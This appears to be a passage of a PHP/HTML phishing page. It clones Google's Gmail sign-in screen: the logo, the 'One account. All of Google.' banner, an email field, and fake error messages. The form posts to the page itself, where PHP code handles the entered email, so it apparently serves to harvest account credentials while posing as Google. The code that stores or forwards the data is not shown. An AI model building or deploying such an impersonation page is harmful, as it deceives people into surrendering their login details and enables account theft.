  background-image: url(https://ssl.gstatic.com/accounts/ui/avatar_2x.png);
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
}

</style>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="main-content 
  
  
    no-name
  
  
  
">
<div class="card signin-card
  
    pre-shift
  
  
  
   no-name">
  <div id="cc_iframe_parent"></div>
  <div class="circle-mask" style="
      
        
      ">
  <canvas id="canvas" class="circle" width="85" height="85"></canvas>
  </div>
   <form method="post" action=" ">

  <div class="form-panel first valid" id="gaia_firstform">
  <div class="slide-out ">
  <div class="input-wrapper focused">
  <div id="identifier-shown">
  <div>
  <label class="hidden-label" for="Email">
  Enter your email</label>
  <input id="Email" name="Email" placeholder="Enter your email" autocomplete="off" required="" type="text"
            
            autofocus>

  </div>
  </div>
  <div style="color:red; margin:3px;"> <font size="2"><?php if(isset($_POST['submit'])){ 
if(empty($userEmail)){
 
?>
  <style>.need-help {
  margin-top:5px;
}  
.signin-card {
  height: 520px;
  }

</style> <?php

 echo " Please enter your email. ";}
 else{
 ?> 
  <style>.need-help {
  margin-top:5px;
}  
.signin-card {
  height: 540px;
  }

</style> 
 
<?php
 
  echo "
  Sorry, Google doesn't recognize that email. ";}}else{  ?> 
 <div style="color:red; margin:10px;">
</div> <style>.need-help {
  margin-top:9px; }
  .signin-card {
  height: 505px;
}</style> 
   <?php
} ?> </font> 
  </div>
  </div>
<div style="display: none" id="identifier-captcha">
<div class="audio-box">
  <div id="playIdentifierAudio"></div>
</div>
<div id="captcha-box" class="captcha-box">
  <div id="captcha-img" class="captcha-img" data-alt-text="Visual verification">
  </div>
  <span class="captcha-msg">
  Letters are not case-sensitive
  </span>
</div>

</div>
<button type="submit" class="rc-button rc-button-submit" name = "submit">Next</button>
  <a class="need-help"
        href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ignoreShadow=0&amp;hl=en"
        >
  Find my account
  </a>
  </div>
  </div>
  <a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1" tabindex="-1">
  <img id="back-arrow" class="back-arrow " aria-label="Back" tabindex="0" alt="Back"
      
        src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png"
      
    >
  </a>
  <div class="form-panel second">
  <div class="slide-in hide-form">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie"
                 type="checkbox" value="yes"
                 >
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" class="need-help"
        href="https://www.google.com/accounts/recovery?hl=en"
        >
  Forgot password?
  </a>
  </div>
  </div>
  <span id="inge" style="display: none" role="alert" class="error-msg">
  Sorry, Google doesn't recognize that email. <a href="https://accounts.google.com/SignUpWithoutGmail?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">Create an account</a> using that address?
  </span>
  <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  Something went wrong. Check your connection and try again.
  </span>
  </form>
</div>
  <div class="card-mask-wrap
    
        
     no-name">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=en&amp;service=mail&amp;scc=1">
  Sign in with a different account
  </a>
  </span>
  <span id="link-signup">
  <a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
  Create account
  </a>
  </span>
  </p>
<?php 
include "footer.php";

?>
